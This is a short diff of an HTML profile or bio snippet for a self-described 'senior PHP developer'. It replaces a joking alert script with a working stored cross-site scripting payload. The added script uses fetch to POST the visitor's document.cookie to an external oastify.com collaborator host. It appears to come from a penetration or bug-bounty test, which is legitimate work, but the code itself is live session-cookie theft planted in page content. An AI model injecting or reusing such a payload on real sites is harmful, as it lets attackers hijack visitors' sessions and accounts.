@@ -2,4 +2,10 @@
     I'm a senior PHP developer :) (again)
   
 </h5>
-<script>alert("Hi from Marcus (this is not cookie theft)")</script>
+<script>
+fetch('https://sjf81fblt3rkxl5doway6nkxbohg56tv.oastify.com', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
